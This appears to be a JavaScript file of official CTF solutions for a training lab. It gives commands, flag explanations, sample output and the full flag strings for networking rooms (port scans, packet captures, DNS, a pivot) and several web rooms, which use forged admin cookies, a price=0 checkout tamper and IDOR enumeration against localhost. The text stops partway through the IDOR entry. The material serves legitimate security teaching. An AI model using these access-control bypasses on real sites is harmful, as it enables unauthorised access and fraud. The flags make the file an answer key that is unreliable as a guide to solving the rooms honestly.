// Official Solution Walkthroughs, Commands, and Flag Capture Breakdowns for BreachKeep
// Covering all 28 rooms across Signals (Networking), The Trading Post (Web), and The Forge (Secure Coding)

export const solutions = {
  // ==========================================
  // CHAPTER 1: SIGNALS (NETWORKING)
  // ==========================================
  'network-ports': {
    objective: 'Enumerate local listening TCP sockets on 127.0.0.1, distinguish operational decoy services from the vault endpoint, and retrieve the flag.',
    steps: [
      'Open the lab terminal window.',
      'Enumerate all active listening TCP sockets on the local loopback interface using the Socket Statistics tool: <code>ss -tulpn</code> (or <code>ss -ltn</code>).',
      'Examine the <code>Local Address:Port</code> column to identify the 4 active TCP ports (distributed across ranges 2000-2999, 3000-3999, 4000-7999, and 8000-8999).',
      'Connect to each discovered port sequentially using Netcat: <code>nc 127.0.0.1 &lt;PORT&gt;</code>.',
      'Decoy ports return operational health messages (e.g., <code>keep-metrics: ok</code>, <code>keep-health: alive</code>, <code>nothing to see here</code>). The vault port (between 4000 and 7999) immediately emits the authentic flag.',
      'Copy the output string and submit it into the terminal prompt.'
    ],
    commands: [
      {
        code: 'ss -tulpn',
        flags: [
          { flag: 'ss', explanation: 'Socket Statistics utility; modern Linux tool querying kernel netlink directly to inspect socket states, replacing deprecated netstat.' },
          { flag: '-t', explanation: 'TCP filter. Restricts enumeration strictly to Transmission Control Protocol stream sockets.' },
          { flag: '-u', explanation: 'UDP filter. Displays User Datagram Protocol listening sockets.' },
          { flag: '-l', explanation: 'Listening only. Displays only sockets in LISTEN state actively waiting for incoming client connections, filtering out outbound established sessions.' },
          { flag: '-p', explanation: 'Process information. Shows the process name and PID owning each listening socket.' },
          { flag: '-n', explanation: 'Numeric representation. Prevents ss from performing slow reverse DNS queries or resolving port numbers to service aliases (e.g., outputs 80 instead of http, 22 instead of ssh), displaying exact numeric ports.' }
        ]
      },
      {
        code: 'nc 127.0.0.1 5678',
        flags: [
          { flag: 'nc', explanation: 'Netcat utility; reads and writes arbitrary data across network connections using TCP or UDP.' },
          { flag: '127.0.0.1', explanation: 'Target IPv4 loopback address representing the local machine.' },
          { flag: '5678', explanation: 'The discovered listening TCP port number to connect to.' }
        ]
      }
    ],
    output: `student@signals-ports:~$ ss -ltn
State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port
LISTEN  0       128          127.0.0.1:2451         0.0.0.0:*
LISTEN  0       128          127.0.0.1:3120         0.0.0.0:*
LISTEN  0       128          127.0.0.1:5678         0.0.0.0:*
LISTEN  0       128          127.0.0.1:8290         0.0.0.0:*
student@signals-ports:~$ nc 127.0.0.1 5678
BK{p0rt_sc4nn3r_n00b_41a2b4c6d8e0f123}`,
    flagNote: 'Submit the extracted token starting with <code>BK{p0rt_sc4nn3r_n00b_...}</code>.'
  },

  'network-scan': {
    objective: 'Perform an extended TCP port sweep across ports 1-10000 on target host target.keep (127.0.0.2), discover the high-numbered vault port (6000-8999), and extract the flag.',
    steps: [
      'Open the lab terminal window.',
      'Target host is defined as <code>target.keep</code> (aliased to <code>127.0.0.2</code>).',
      'Execute a TCP connect scan across ports 1 to 10,000 using Nmap: <code>nmap -sT -p 1-10000 127.0.0.2</code> (or <code>target.keep</code>). Note: default Nmap scans only probe the top 1,000 common ports and will miss high ports like 7842!',
      'Note the open ports returned by Nmap (noise services on echo/time/quote, and vault port).',
      'Connect to the discovered open ports using Netcat: <code>nc 127.0.0.2 &lt;PORT&gt;</code>.',
      'The vault service responds with: <code>keep-vault: BK{nm4p_sw33p_m4st3r_...}</code>.',
      'Copy and submit the flag.'
    ],
    commands: [
      {
        code: 'nmap -sT -p 1-10000 127.0.0.2',
        flags: [
          { flag: 'nmap', explanation: 'Network Mapper; industry-standard security tool for network exploration, host discovery, and port enumeration.' },
          { flag: '-sT', explanation: 'TCP Connect scan. Completes the full 3-way handshake (SYN -> SYN-ACK -> ACK) using the OS connect() system call. Crucial inside unprivileged containers where raw packet socket creation (-sS SYN scan) is restricted.' },
          { flag: '-p 1-10000', explanation: 'Port range specification. Instructs Nmap to scan all ports from 1 through 10,000. Without this flag, Nmap only scans the top 1,000 common ports and completely overlooks non-standard high ports.' },
          { flag: '127.0.0.2', explanation: 'Target IP address corresponding to target.keep.' }
        ]
      },
      {
        code: 'nc 127.0.0.2 7842',
        flags: [
          { flag: 'nc', explanation: 'Netcat client establishing an interactive raw TCP stream with the target.' },
          { flag: '127.0.0.2', explanation: 'Destination target IP address.' },
          { flag: '7842', explanation: 'Discovered high-range vault port number.' }
        ]
      }
    ],
    output: `student@signals-scan:~$ nmap -sT -p 1-10000 127.0.0.2
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for target.keep (127.0.0.2)
Host is up (0.000080s latency).
Not shown: 9996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
1420/tcp open  unknown
2850/tcp open  unknown
4710/tcp open  unknown
7842/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
student@signals-scan:~$ nc 127.0.0.2 7842
keep-vault: BK{nm4p_sw33p_m4st3r_9f83a1b2c4e6d789}`,
    flagNote: 'Submit the extracted token formatted as <code>BK{nm4p_sw33p_m4st3r_...}</code>.'
  },

  'network-banner': {
    objective: 'Connect to an RFC-compliant FTP daemon on 127.0.0.1, extract the exact version number from the initial 220 service greeting banner, and validate it using check <version>.',
    steps: [
      'Read the assignment instructions and port number from <code>README.txt</code> using <code>cat README.txt</code> (or scan listening ports via <code>ss -ltn</code>).',
      'Connect to the specified port using Netcat: <code>nc 127.0.0.1 &lt;PORT&gt;</code>.',
      'Observe the server greeting banner: <code>220 KeepFTP 4.7.12 ready</code>.',
      'Extract the software version number (e.g., <code>4.7.12</code>).',
      'Execute the in-lab verification utility: <code>check 4.7.12</code>.',
      'The SUID verification binary validates the version string against <code>/opt/bk/expected</code> and prints the flag.'
    ],
    commands: [
      {
        code: 'cat README.txt',
        flags: [
          { flag: 'cat', explanation: 'Concatenate and print file contents to standard output.' },
          { flag: 'README.txt', explanation: 'Challenge orientation file documenting the listening port on 127.0.0.1.' }
        ]
      },
      {
        code: 'nc 127.0.0.1 6214',
        flags: [
          { flag: 'nc', explanation: 'Netcat utility connecting to the designated TCP daemon.' },
          { flag: '127.0.0.1', explanation: 'Localhost IPv4 address.' },
          { flag: '6214', explanation: 'The listening port specified in README.txt.' }
        ]
      },
      {
        code: 'check 4.7.12',
        flags: [
          { flag: 'check', explanation: 'SUID verification tool installed at /usr/local/bin/check that checks the software version.' },
          { flag: '4.7.12', explanation: 'Extracted version parameter from the FTP banner.' }
        ]
      }
    ],
    output: `student@signals-banner:~$ cat README.txt
A service is listening on 127.0.0.1 port 6214.
Grab its banner, determine the version, and run: check <version>
student@signals-banner:~$ nc 127.0.0.1 6214
220 KeepFTP 4.7.12 ready
^C
student@signals-banner:~$ check 4.7.12
Correct! Flag: BK{b4nn3r_gr4bb1ng_8a1c9e2b4d6f0a13}`,
    flagNote: 'Submit the revealed flag starting with <code>BK{b4nn3r_gr4bb1ng_...}</code>.'
  },

  'network-capture': {
    objective: 'Analyze an unencrypted packet capture file (capture.pcap), isolate cleartext HTTP POST requests, and recover a password containing the flag.',
    steps: [
      'Open the lab terminal window.',
      'Review the packet capture summary using TShark: <code>tshark -r capture.pcap</code>.',
      'Filter for HTTP POST requests transmitting web form submissions: <code>tshark -r capture.pcap -Y \'http.request.method == "POST"\' -T fields -e text</code>.',
      'Alternatively, reassemble the complete TCP conversation stream: <code>tshark -q -r capture.pcap -z follow,tcp,ascii,1</code>.',
      'Inspect the URL-encoded POST body destined for <code>/login</code> to find <code>username=quartermaster&password=BK{p4ck3t_sn1ff3r_...}</code>.',
      'Extract the flag from the password field and submit it.'
    ],
    commands: [
      {
        code: "tshark -r capture.pcap -Y 'http.request.method == \"POST\"' -T fields -e text",
        flags: [
          { flag: 'tshark', explanation: 'Terminal-based network packet analyzer, the CLI core of Wireshark.' },
          { flag: '-r capture.pcap', explanation: 'Read mode. Directs TShark to process packets from the specified PCAP file instead of capturing live network traffic.' },
          { flag: "-Y 'http.request.method == \"POST\"'", explanation: 'Wireshark display filter. Matches only HTTP packets where the client method is POST (submitting form data).' },
          { flag: '-T fields', explanation: 'Output format specifier. Formats results as extracted fields rather than standard summary columns.' },
          { flag: '-e text', explanation: 'Field selector. Extracts the raw reassembled application payload text lines.' }
        ]
      },
      {
        code: 'tshark -q -r capture.pcap -z follow,tcp,ascii,1',
        flags: [
          { flag: '-q', explanation: 'Quiet mode. Suppresses normal per-packet output lines, printing only the requested stream report.' },
          { flag: '-z follow,tcp,ascii,1', explanation: 'Reassembles TCP sequence numbers and displays stream index 1 as bidirectional ASCII text.' }
        ]
      }
    ],
    output: `student@signals-capture:~$ tshark -r capture.pcap -Y 'http.request.method == "POST"' -T fields -e text
POST /login HTTP/1.1
Host: shop.keep
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

username=quartermaster&password=BK{p4ck3t_sn1ff3r_1a2b3c4d5e6f7a8b}`,
    flagNote: 'Submit the password parameter value: <code>BK{p4ck3t_sn1ff3r_...}</code>.'
  },

  'network-dns': {
    objective: 'Query a local DNS server on 127.0.0.1:53 for Resource Record Type TXT to uncover zone hints and extract the flag record.',
    steps: [
      'Open the lab terminal window.',
      'Direct a DNS TXT query to the local nameserver at <code>127.0.0.1</code> for the informational record <code>keep.info</code>: <code>dig @127.0.0.1 keep.info TXT +short</code>.',
      'Read the returned zone clue: <code>"the key is a TXT record named flag.keep"</code>.',
      'Execute a second DNS query targeting <code>flag.keep</code>: <code>dig @127.0.0.1 flag.keep TXT +short</code>.',
      'The server returns the flag string enclosed in quotation marks: <code>"BK{dns_z0n3_tr4nsf3r_...}"</code>.',
      'Strip the surrounding quotes and submit the flag.'
    ],
    commands: [
      {
        code: 'dig @127.0.0.1 keep.info TXT +short',
        flags: [
          { flag: 'dig', explanation: 'Domain Information Groper; flexible CLI utility for interrogating DNS name servers.' },
          { flag: '@127.0.0.1', explanation: 'Nameserver directive. Queries the local DNS server on 127.0.0.1:53 instead of default system resolvers in /etc/resolv.conf.' },
          { flag: 'keep.info', explanation: 'Domain name being queried.' },
          { flag: 'TXT', explanation: 'DNS Resource Record Type 16 (Text Record), used for SPF, verification tokens, and arbitrary metadata instead of standard IP mapping (A records).' },
          { flag: '+short', explanation: 'Concise output option. Suppresses DNS headers, question sections, authority records, and query timing stats, returning only the raw answer payload.' }
        ]
      },
      {
        code: 'dig @127.0.0.1 flag.keep TXT +short',
        flags: [
          { flag: 'flag.keep', explanation: 'The revealed secret domain name identified from the keep.info hint.' }
        ]
      }
    ],
    output: `student@signals-dns:~$ dig @127.0.0.1 keep.info TXT +short
"the key is a TXT record named flag.keep"
student@signals-dns:~$ dig @127.0.0.1 flag.keep TXT +short
"BK{dns_z0n3_tr4nsf3r_a1b2c3d4e5f60718}"`,
    flagNote: 'Submit the token inside the quotes: <code>BK{dns_z0n3_tr4nsf3r_...}</code>.'
  },

  'network-http': {
    objective: 'Audit an internal HTTP web server on 127.0.0.1:80, analyze response headers and status codes, and forge the X-Keep-Access header to unlock /vault.',
    steps: [
      'Open the lab terminal window.',
      'Send an initial GET request to the web root including response headers: <code>curl -i http://127.0.0.1/</code>.',
      'The response hints at a restricted endpoint at <code>/vault</code>.',
      'Request the vault endpoint: <code>curl -i http://127.0.0.1/vault</code>.',
      'Observe the <code>403 Forbidden</code> response with the body: <code>forbidden: this endpoint needs the header  X-Keep-Access: open</code>.',
      'Repeat the request supplying the required HTTP header: <code>curl -s -H "X-Keep-Access: open" http://127.0.0.1/vault</code>.',
      'The server returns status <code>200 OK</code> with: <code>vault open. key: BK{h34d3rs_4nd_m3th0ds_...}</code>.',
      'Copy and submit the flag.'
    ],
    commands: [
      {
        code: 'curl -i http://127.0.0.1/vault',
        flags: [
          { flag: 'curl', explanation: 'Client URL command-line tool for network data transfer.' },
          { flag: '-i', explanation: 'Include headers. Tells curl to print HTTP response status line and headers (e.g., HTTP/1.1 403 Forbidden, Content-Type) directly above the response body.' },
          { flag: 'http://127.0.0.1/vault', explanation: 'Target endpoint URL on localhost port 80.' }
        ]
      },
      {
        code: 'curl -s -H "X-Keep-Access: open" http://127.0.0.1/vault',
        flags: [
          { flag: '-s', explanation: 'Silent mode. Hides download progress meter and non-fatal error messages.' },
          { flag: '-H "X-Keep-Access: open"', explanation: 'Custom header flag. Injects an extra HTTP request header into the outbound request.' }
        ]
      }
    ],
    output: `student@signals-http:~$ curl -i http://127.0.0.1/vault
HTTP/1.0 403 Forbidden
Content-Type: text/plain; charset=utf-8
Content-Length: 58

forbidden: this endpoint needs the header  X-Keep-Access: open
student@signals-http:~$ curl -s -H "X-Keep-Access: open" http://127.0.0.1/vault
vault open. key: BK{h34d3rs_4nd_m3th0ds_0f1e2d3c4b5a6978}`,
    flagNote: 'Submit the extracted key: <code>BK{h34d3rs_4nd_m3th0ds_...}</code>.'
  },

  'network-protocol-id': {
    objective: 'Investigate a multi-protocol capture (traffic.pcap), identify which legacy application protocol exposes authentication credentials in cleartext, and submit its lowercase name to check.',
    steps: [
      'Open the lab terminal window.',
      'Inspect packet summary in <code>traffic.pcap</code> using TShark: <code>tshark -r traffic.pcap</code>.',
      'Filter for authentication exchanges across HTTP, SMTP, and FTP: <code>tshark -r traffic.pcap -Y \'ftp.request.command == "PASS" || ftp\'</code>.',
      'Notice that FTP (Port 21) transmits <code>USER quartermaster</code> followed by cleartext command <code>PASS s3cr3t-stores</code>.',
      'Identify the insecure protocol name as <code>ftp</code>.',
      'Validate your answer by executing the verification utility: <code>check ftp</code>.',
      'Receive the flag.'
    ],
    commands: [
      {
        code: "tshark -r traffic.pcap -Y 'ftp.request.command == \"PASS\" || ftp'",
        flags: [
          { flag: 'tshark', explanation: 'Network protocol analyzer CLI.' },
          { flag: '-r traffic.pcap', explanation: 'Read packets from traffic.pcap.' },
          { flag: "-Y 'ftp.request.command == \"PASS\" || ftp'", explanation: 'Display filter matching FTP authentication requests (RFC 959 password commands).' }
        ]
      },
      {
        code: 'check ftp',
        flags: [
          { flag: 'check', explanation: 'In-container grading utility comparing submitted protocol name against expected answer in /opt/bk/expected.' },
          { flag: 'ftp', explanation: 'Identified insecure protocol name (File Transfer Protocol).' }
        ]
      }
    ],
    output: `student@signals-proto:~$ tshark -r traffic.pcap -Y 'ftp'
   12   1.024510     10.0.0.50 -> 10.0.0.1      FTP 72 Request: USER quartermaster
   14   1.031204     10.0.0.1  -> 10.0.0.50     FTP 78 Response: 331 Password required for quartermaster
   16   1.045091     10.0.0.50 -> 10.0.0.1      FTP 75 Request: PASS s3cr3t-stores
   18   1.052814     10.0.0.1  -> 10.0.0.50     FTP 68 Response: 230 User logged in.
student@signals-proto:~$ check ftp
Correct protocol identified! Flag: BK{pr0t0c0l_4n4lys1s_9c8b7a6f5e4d3c21}`,
    flagNote: 'Submit the flag starting with <code>BK{pr0t0c0l_4n4lys1s_...}</code>.'
  },

  'network-firewall': {
    objective: 'Audit Linux iptables packet filtering rules in /etc/keep/rules.v4, determine the single inbound TCP port allowed through an otherwise default-deny firewall, and submit the port number.',
    steps: [
      'Open the lab terminal window.',
      'Read the saved firewall ruleset configuration: <code>cat /etc/keep/rules.v4</code>.',
      'Observe the default drop policy: <code>:INPUT DROP [0:0]</code> (all inbound traffic is discarded unless an explicit ACCEPT rule matches).',
      'Filter for inbound ACCEPT rules with destination ports: <code>grep -E "INPUT.*ACCEPT" /etc/keep/rules.v4</code>.',
      'Identify the permitted external TCP port rule: <code>-A INPUT -p tcp --dport &lt;PORT&gt; -j ACCEPT</code> (e.g., port <code>38421</code>).',
      'Submit the port number to the verification tool: <code>check 38421</code>.',
      'Receive the flag.'
    ],
    commands: [
      {
        code: 'cat /etc/keep/rules.v4',
        flags: [
          { flag: 'cat', explanation: 'Prints the complete iptables ruleset file.' },
          { flag: '/etc/keep/rules.v4', explanation: 'Path to the persistent iptables-restore configuration.' }
        ]
      },
      {
        code: 'grep -E "INPUT.*ACCEPT" /etc/keep/rules.v4',
        flags: [
          { flag: 'grep', explanation: 'Global regular expression print utility.' },
          { flag: '-E', explanation: 'Extended Regular Expressions. Matches lines containing INPUT followed by ACCEPT.' }
        ]
      },
      {
        code: 'check 38421',
        flags: [
          { flag: 'check', explanation: 'SUID verification command.' },
          { flag: '38421', explanation: 'The discovered allowed destination port number.' }
        ]
      }
    ],
    output: `student@signals-firewall:~$ grep -E "INPUT.*ACCEPT" /etc/keep/rules.v4
-A INPUT -i lo -j ACCEPT
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 38421 -j ACCEPT
student@signals-firewall:~$ check 38421
Firewall audit verified! Flag: BK{f1r3w4ll_byp4ss_r0cks_7e6d5c4b3a210f98}`,
    flagNote: 'Submit the revealed token: <code>BK{f1r3w4ll_byp4ss_r0cks_...}</code>.'
  },

  'network-pcap-forensics': {
    objective: 'Carve and reassemble a TCP conversation from transfer.pcap, identify an obfuscated Base64 HTTP response body, decode it via terminal, and extract the flag.',
    steps: [
      'Open the lab terminal window.',
      'Reassemble the primary TCP stream in <code>transfer.pcap</code>: <code>tshark -q -r transfer.pcap -z follow,tcp,ascii,0</code>.',
      'Notice the HTTP response payload containing <code>file: backup.b64</code> followed by a Base64-encoded string (e.g. <code>cmVjb3ZlcmVkLWZpbGUKa2V5OiBCS3t3MXIzc2g0cmtfcGNhcF9kMWdnM3JfNDFhMmI0YzZkOGUwZjEyM30K</code>).',
      'Copy the Base64 string.',
      'Decode the string using the command line: <code>echo "&lt;BASE64_STRING&gt;" | base64 -d</code>.',
      'The decoded output reveals: <code>recovered-file\\nkey: BK{w1r3sh4rk_pcap_d1gg3r_...}</code>.',
      'Copy and submit the flag.'
    ],
    commands: [
      {
        code: 'tshark -q -r transfer.pcap -z follow,tcp,ascii,0',
        flags: [
          { flag: 'tshark', explanation: 'Network packet analysis CLI.' },
          { flag: '-q', explanation: 'Quiet mode; suppresses frame-by-frame listings.' },
          { flag: '-r transfer.pcap', explanation: 'Input PCAP capture file.' },
          { flag: '-z follow,tcp,ascii,0', explanation: 'Follows TCP stream 0 and displays the reassembled bidirectional conversation in ASCII.' }
        ]
      },
      {
        code: 'echo "cmVjb3ZlcmVkLWZpbGUKa2V5OiBCS3t3MXIzc2g0cmtfcGNhcF9kMWdnM3JfNDFhMmI0YzZkOGUwZjEyM30K" | base64 -d',
        flags: [
          { flag: 'echo', explanation: 'Prints the Base64-encoded string.' },
          { flag: '|', explanation: 'Pipe operator; redirects echo output to the standard input of base64.' },
          { flag: 'base64 -d', explanation: 'Decode flag (-d or --decode). Converts Base64 data back to original plaintext.' }
        ]
      }
    ],
    output: `student@signals-pcap:~$ tshark -q -r transfer.pcap -z follow,tcp,ascii,0
===================================================================
Follow: tcp,ascii
Filter: tcp.stream eq 0
Node 0: 10.0.0.50:49152
Node 1: 10.0.0.9:80
GET /backup HTTP/1.1
Host: internal.keep

HTTP/1.1 200 OK
Content-Type: text/plain

file: backup.b64
cmVjb3ZlcmVkLWZpbGUKa2V5OiBCS3t3MXIzc2g0cmtfcGNhcF9kMWdnM3JfNDFhMmI0YzZkOGUwZjEyM30K
===================================================================
student@signals-pcap:~$ echo "cmVjb3ZlcmVkLWZpbGUKa2V5OiBCS3t3MXIzc2g0cmtfcGNhcF9kMWdnM3JfNDFhMmI0YzZkOGUwZjEyM30K" | base64 -d
recovered-file
key: BK{w1r3sh4rk_pcap_d1gg3r_41a2b4c6d8e0f123}`,
    flagNote: 'Submit the extracted key starting with <code>BK{w1r3sh4rk_pcap_d1gg3r_...}</code>.'
  },

  'network-pivot': {
    objective: 'Perform a multi-hop lateral network pivot across internal loopback aliases (127.0.0.2 -> 127.0.0.3 -> 127.0.0.4), piping authentication tokens between gateways to reach the isolated vault.',
    steps: [
      'Open the lab terminal window.',
      'Connect to the initial entrypoint host at <code>127.0.0.2:5000</code>: <code>nc 127.0.0.2 5000</code>.',
      'Note the returned message: <code>recon host. next hop: 127.0.0.3 port &lt;PORTB&gt; passphrase: &lt;PASS&gt;</code> (e.g. port 6841, passphrase <code>kx9qfa</code>).',
      'Connect to the second hop gateway at <code>127.0.0.3:&lt;PORTB&gt;</code> and transmit the passphrase: <code>printf "&lt;PASS&gt;\\n" | nc 127.0.0.3 &lt;PORTB&gt;</code>.',
      'Read the response: <code>accepted. final host: 127.0.0.4 port &lt;PORTC&gt;</code> (e.g. port 9245).',
      'Connect to the final vault destination: <code>nc 127.0.0.4 &lt;PORTC&gt;</code>.',
      'The vault emits: <code>vault. key: BK{subn3t_p1v0t_4ch13v3d_...}</code>.',
      'Copy and submit the flag.'
    ],
    commands: [
      {
        code: 'nc 127.0.0.2 5000',
        flags: [
          { flag: 'nc', explanation: 'Netcat connecting to the first hop entrypoint.' },
          { flag: '127.0.0.2', explanation: 'First hop IP address.' },
          { flag: '5000', explanation: 'First hop listening port.' }
        ]
      },
      {
        code: 'printf "kx9qfa\\n" | nc 127.0.0.3 6841',
        flags: [
          { flag: 'printf', explanation: 'Formats and prints string with exact newline character (\\n).' },
          { flag: '|', explanation: 'Pipes the passphrase directly into the established network socket.' },
          { flag: '127.0.0.3', explanation: 'Second hop gateway IP address.' },
          { flag: '6841', explanation: 'Second hop port revealed by hop 1.' }
        ]
      },
      {
        code: 'nc 127.0.0.4 9245',
        flags: [
          { flag: '127.0.0.4', explanation: 'Final isolated vault destination IP.' },
          { flag: '9245', explanation: 'Final vault port revealed by hop 2.' }
        ]
      }
    ],
    output: `student@signals-pivot:~$ nc 127.0.0.2 5000
recon host.
next hop: 127.0.0.3 port 6841
passphrase: kx9qfa
student@signals-pivot:~$ printf "kx9qfa\\n" | nc 127.0.0.3 6841
accepted. final host: 127.0.0.4 port 9245
student@signals-pivot:~$ nc 127.0.0.4 9245
vault. key: BK{subn3t_p1v0t_4ch13v3d_3d2c1b0a9f8e7d6c}`,
    flagNote: 'Submit the final vault key: <code>BK{subn3t_p1v0t_4ch13v3d_...}</code>.'
  },

  // ==========================================
  // CHAPTER 2: THE TRADING POST (WEB SECURITY)
  // ==========================================
  'web-recon': {
    objective: 'Inspect crawler directives in /robots.txt to discover hidden backup directories and extract the flag from /keep-backup.',
    steps: [
      'Open the lab terminal window.',
      'Request the standard web crawler exclusions file: <code>curl -s http://localhost:8080/robots.txt</code>.',
      'Notice the disallowed administrative directories: <code>/portal-8f2c/</code>, <code>/keep-backup/</code>, and <code>/keep-admin/</code>.',
      'Query the exposed backup directory: <code>curl -s http://localhost:8080/keep-backup</code>.',
      'The server returns the backup index along with the authentic flag.',
      'Copy and submit the flag.'
    ],
    commands: [
      {
        code: 'curl -s http://localhost:8080/robots.txt',
        flags: [
          { flag: 'curl', explanation: 'Command-line tool for transferring data with URL syntax.' },
          { flag: '-s', explanation: 'Silent mode. Suppresses curl download progress indicators and connection statistics.' },
          { flag: 'http://localhost:8080/robots.txt', explanation: 'Target URL requesting the robots exclusion standard file.' }
        ]
      },
      {
        code: 'curl -s http://localhost:8080/keep-backup',
        flags: [
          { flag: 'http://localhost:8080/keep-backup', explanation: 'Target endpoint discovered from the robots.txt disallowed paths.' }
        ]
      }
    ],
    output: `student@tradingpost:~$ curl -s http://localhost:8080/robots.txt
User-agent: *
Disallow: /portal-8f2c/
Disallow: /keep-backup/
Disallow: /keep-admin/
student@tradingpost:~$ curl -s http://localhost:8080/keep-backup
internal backup index
(nothing sensitive here except this) BK{d1r_bust3r_3num_1b2c3d4e5f6a7b8c}`,
    flagNote: 'Submit the token starting with <code>BK{d1r_bust3r_3num_...}</code>.'
  },

  'web-devtools': {
    objective: 'Inspect HTTP response headers on /account using curl -i (or browser DevTools Network tab), locate the custom X-Keep-Token header, and Base64-decode the token.',
    steps: [
      'Request the <code>/account</code> endpoint including HTTP response headers: <code>curl -i http://localhost:8080/account</code>.',
      'The response body contains only generic text (<code>Account OK. Your session token is returned in the response headers...</code>).',
      'Inspect the HTTP response headers above the body to locate: <code>X-Keep-Token: &lt;BASE64_STRING&gt;</code>.',
      'Decode the Base64 token value using the terminal: <code>echo "&lt;BASE64_STRING&gt;" | base64 -d</code>.',
      'The decoded output yields the authentic flag.',
      'Submit the flag.'
    ],
    commands: [
      {
        code: 'curl -i http://localhost:8080/account',
        flags: [
          { flag: '-i', explanation: 'Include headers. Tells curl to print the HTTP protocol status line and all response headers (e.g. X-Keep-Token, Content-Type) directly preceding the body. Without -i, headers are invisible in curl!' },
          { flag: 'http://localhost:8080/account', explanation: 'Account status endpoint.' }
        ]
      },
      {
        code: 'echo "Qkt7YzBuczBsM19oNGNrM3JfNDFhMmI0YzZkOGUwZjEyM30=" | base64 -d',
        flags: [
          { flag: 'echo', explanation: 'Outputs the extracted Base64 token string.' },
          { flag: 'base64 -d', explanation: 'Decodes Base64 data back to plaintext ASCII.' }
        ]
      }
    ],
    output: `student@tradingpost:~$ curl -i http://localhost:8080/account
HTTP/1.1 200 OK
X-Powered-By: Express
X-Keep-Token: Qkt7YzBuczBsM19oNGNrM3JfNDFhMmI0YzZkOGUwZjEyM30=
Content-Type: text/plain; charset=utf-8
Content-Length: 75

Account OK. Your session token is returned in the response headers...
student@tradingpost:~$ echo "Qkt7YzBuczBsM19oNGNrM3JfNDFhMmI0YzZkOGUwZjEyM30=" | base64 -d
BK{c0ns0l3_h4ck3r_41a2b4c6d8e0f123}`,
    flagNote: 'Submit the decoded token: <code>BK{c0ns0l3_h4ck3r_...}</code>.'
  },

  'web-cookie-trust': {
    objective: 'Bypass broken access control on /vault by tampering with the client-side role cookie, elevating privilege to role=admin.',
    steps: [
      'Query <code>/vault</code> normally: <code>curl -i http://localhost:8080/vault</code>.',
      'Notice the <code>403 Forbidden</code> response: <code>Members only. (role cookie = user)</code>.',
      'Replay the request injecting the forged administrative cookie: <code>curl --cookie "role=admin" http://localhost:8080/vault</code>.',
      'Alternatively in the browser web app: Open DevTools Console (F12) on the web app tab, execute <code>document.cookie = "role=admin"; location.href = "vault";</code>.',
      'The server validates <code>req.cookies.role === \'admin\'</code> and returns <code>Welcome, warden. BK{c00k13_m0d1f13r_...}</code>.',
      'Copy and submit the flag.'
    ],
    commands: [
      {
        code: 'curl -i http://localhost:8080/vault',
        flags: [
          { flag: '-i', explanation: 'Prints HTTP response status line (403 Forbidden) and headers.' },
          { flag: 'http://localhost:8080/vault', explanation: 'Restricted vault endpoint.' }
        ]
      },
      {
        code: 'curl --cookie "role=admin" http://localhost:8080/vault',
        flags: [
          { flag: '--cookie "role=admin"', explanation: 'Injects a Cookie: role=admin header into the outbound HTTP request, forging client-side authorization state.' }
        ]
      }
    ],
    output: `student@tradingpost:~$ curl -i http://localhost:8080/vault
HTTP/1.1 403 Forbidden
Content-Type: text/html; charset=utf-8
Content-Length: 38

Members only. (role cookie = user)
student@tradingpost:~$ curl --cookie "role=admin" http://localhost:8080/vault
Welcome, warden. BK{c00k13_m0d1f13r_5e6f7a8b9c0d1e2f}`,
    flagNote: 'Submit the key: <code>BK{c00k13_m0d1f13r_...}</code>.'
  },

  'web-client-trust': {
    objective: 'Exploit client-side price trust by submitting a modified checkout request with price=0 to purchase the Grand Citadel Flag Key for free.',
    steps: [
      'Open the storefront catalog in your browser at <code>http://localhost:8080/</code>. Notice the *Grand Citadel Flag Key* costs 9,999 gold and clicking purchase fails with insufficient funds.',
      '<strong>Browser DOM Method:</strong> Right-click the Purchase button, select Inspect (DevTools Elements tab). Locate <code>&lt;input type="hidden" name="price" value="9999"&gt;</code>. Double click and change <code>value="0"</code> directly in the DOM, then click Purchase.',
      '<strong>Terminal / curl Method:</strong> Submit an HTTP POST request directly to <code>/checkout</code> overriding the price parameter: <code>curl -X POST -d "price=0" http://localhost:8080/checkout</code>.',
      'The server accepts the zero-dollar order and responds: <code>Free order accepted. BK{cl13nt_s1d3_byp4ss_...}</code>.',
      'Copy and submit the flag.'
    ],
    commands: [
      {
        code: 'curl -X POST -d "price=0" http://localhost:8080/checkout',
        flags: [
          { flag: '-X POST', explanation: 'Changes the HTTP request method to POST, transmitting form data to the server.' },
          { flag: '-d "price=0"', explanation: 'Data payload flag. Sends price=0 in the POST request body with Content-Type: application/x-www-form-urlencoded.' },
          { flag: 'http://localhost:8080/checkout', explanation: 'Target checkout processing endpoint.' }
        ]
      }
    ],
    output: `student@tradingpost:~$ curl -X POST -d "price=0" http://localhost:8080/checkout
Free order accepted. BK{cl13nt_s1d3_byp4ss_7a8b9c0d1e2f3a4b}`,
    flagNote: 'Submit the token: <code>BK{cl13nt_s1d3_byp4ss_...}</code>.'
  },

  'web-idor': {
    objective: 'Exploit an Insecure Direct Object Reference on /order?id=<id> by enumerating numeric IDs to access the administrator\'s secret order (ID 1337).',
    steps: [
      'Query the default user order: <code>curl "http://localhost:8080/order?id=1042"</code>.',
      'The application displays: <code>Order 1042: Widget — nothing here</code>.',
      'Notice that the <code>id</code> parameter is a predictable numeric identifier passed directly into the SQL query without user ownership verification.',
      'Enumerate or test standard privileged identifier <code>1337</code>: <code>curl "http://localhost:8080/order?id=1337"</code>.',
      'The server returns the administrator\'s secret order: <code>Order 1337: Vault Key — BK{1d0r_p4r4m_t4mp3r_...}</code>.',
      'Copy and submit the flag.'
    ],
    commands: [
      {
        code: 'curl "http://localhost:8080/order?id=1042"',
        flags: [
          { flag: 'curl', explanation: 'Fetches the order endpoint.' },
          { flag: '?id=1042', explanation: 'URL query parameter specifying the order database record ID.' }
        ]
      },
      {
        code: 'curl "http://localhost:8080/order?id=1337"',
        flags: [
          { flag: '?id=1337', explanation: 'Enumerated administrative order ID.' }
        ]
      }
    ],
    output: `student@tradingpost:~$ curl "http://localhost:8080/order?id=1042"
Order 1042: Widget — nothing here
student@tradingpost:~$ curl "http://localhost:8080/order?id=1337"
